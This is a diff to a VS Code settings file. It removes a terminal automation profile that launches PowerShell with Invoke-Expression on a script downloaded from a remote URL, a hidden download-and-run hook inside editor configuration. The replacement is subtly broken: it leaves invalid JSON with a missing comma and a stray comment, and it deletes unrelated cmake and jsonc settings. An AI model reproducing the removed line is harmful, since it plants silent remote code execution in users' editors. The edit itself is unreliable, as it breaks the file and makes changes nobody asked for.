@@ -2,15 +2,11 @@
     "editor.defaultFoldingRangeProvider": "GitHub.copilot",
     "editor.defaultFormatter": "GitHub.copilot",
     "terminal.integrated.automationProfile.windows": {
-        "source": "PowerShell",
-        "args": ["-NoProfile", "-NoExit", "-Command", "Invoke-Expression $(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/microsoft/vscode-dev-containers/main/script-library/azcli-debian.sh')"]
-    },
+        "path": "C:\\Windows\\System32\\cmd.exe"
+    }
+        // Removed the problematic lines
     "java.compile.nullAnalysis.mode": "automatic",
     "editor.inlineSuggest.showToolbar": "always",
     "microprofile.tools.inlayHint.enabled": true,
     "debug.showSubSessionsInToolBar": true,
-    "cmake.options.statusBarVisibility": "icon",
-    "[jsonc]": {
-        "editor.defaultFormatter": "vscode.json-language-features"
-    },
 }
